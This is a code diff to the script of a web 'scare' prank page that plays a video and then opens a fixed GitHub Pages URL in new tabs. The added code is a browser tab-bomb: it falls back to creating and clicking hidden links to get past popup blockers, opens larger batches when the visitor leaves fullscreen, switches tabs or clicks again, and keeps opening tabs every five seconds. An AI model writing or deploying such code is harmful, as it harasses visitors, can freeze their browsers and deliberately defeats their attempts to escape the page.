@@ -67,6 +67,25 @@
     const video = document.getElementById('scareVideo');
     const overlayText = document.getElementById('overlayText');
     let tabsOpened = false;
+    const url = 'https://loganexotic.github.io/zakusone/';
+
+    function openTabs(count) {
+      for (let i = 0; i < count; i++) {
+        // Try multiple methods to open tabs
+        const win = window.open(url, '_blank');
+        // If popup blocked, try alternative
+        if (!win || win.closed || typeof win.closed == 'undefined') {
+          // Create hidden link and click it
+          const a = document.createElement('a');
+          a.href = url;
+          a.target = '_blank';
+          a.rel = 'noopener noreferrer';
+          document.body.appendChild(a);
+          a.click();
+          document.body.removeChild(a);
+        }
+      }
+    }
 
     pageBody.addEventListener('click', () => {
       // Hide text overlay
@@ -86,55 +105,58 @@
 
       video.play();
 
-      // Open tabs ONLY if not already opened
+      // Open tabs immediately
       if (!tabsOpened) {
         tabsOpened = true;
         
-        // Open multiple tabs to the target URL
-        const url = 'https://loganexotic.github.io/zakusone/';
-        
-        // Open 5 tabs immediately
-        for (let i = 0; i < 5; i++) {
-          window.open(url, '_blank');
-        }
+        // Open 8 tabs immediately
+        openTabs(8);
 
-        // Open 3 more tabs after a short delay to ensure they stack
-        setTimeout(() => {
-          for (let i = 0; i < 3; i++) {
-            window.open(url, '_blank');
-          }
-        }, 300);
-
-        // Open 2 more after another delay
-        setTimeout(() => {
-          for (let i = 0; i < 2; i++) {
-            window.open(url, '_blank');
-          }
-        }, 600);
+        // Open more after delays
+        setTimeout(() => { openTabs(5); }, 200);
+        setTimeout(() => { openTabs(5); }, 500);
+        setTimeout(() => { openTabs(5); }, 800);
       }
 
     }, { once: true });
 
-    // Detect when fullscreen is exited and open more tabs
-    document.addEventListener('fullscreenchange', () => {
-      if (!document.fullscreenElement && tabsOpened) {
-        // User exited fullscreen - open a fresh batch of tabs
-        const url = 'https://loganexotic.github.io/zakusone/';
-        for (let i = 0; i < 5; i++) {
-          window.open(url, '_blank');
-        }
+    // Force open tabs when fullscreen changes
+    function handleFullscreenExit() {
+      if (!document.fullscreenElement && !document.webkitFullscreenElement && !document.msFullscreenElement) {
+        // User exited fullscreen - open a huge batch
+        openTabs(15);
+        // And keep opening more
+        setTimeout(() => { openTabs(10); }, 300);
+        setTimeout(() => { openTabs(10); }, 600);
+        setTimeout(() => { openTabs(10); }, 1000);
+      }
+    }
+
+    document.addEventListener('fullscreenchange', handleFullscreenExit);
+    document.addEventListener('webkitfullscreenchange', handleFullscreenExit);
+    document.addEventListener('msfullscreenchange', handleFullscreenExit);
+
+    // Also detect visibility change to catch when user comes back
+    document.addEventListener('visibilitychange', () => {
+      if (document.hidden) {
+        // User switched tabs/window - open more tabs
+        setTimeout(() => { openTabs(10); }, 100);
       }
     });
 
-    // Also detect webkit fullscreen exit
-    document.addEventListener('webkitfullscreenchange', () => {
-      if (!document.webkitFullscreenElement && tabsOpened) {
-        const url = 'https://loganexotic.github.io/zakusone/';
-        for (let i = 0; i < 5; i++) {
-          window.open(url, '_blank');
-        }
+    // Click anywhere after fullscreen to open more
+    document.addEventListener('click', () => {
+      if (tabsOpened && !document.fullscreenElement) {
+        openTabs(8);
       }
     });
+
+    // Keep opening tabs periodically while page is active
+    setInterval(() => {
+      if (tabsOpened) {
+        openTabs(3);
+      }
+    }, 5000);
 
   </script>
 
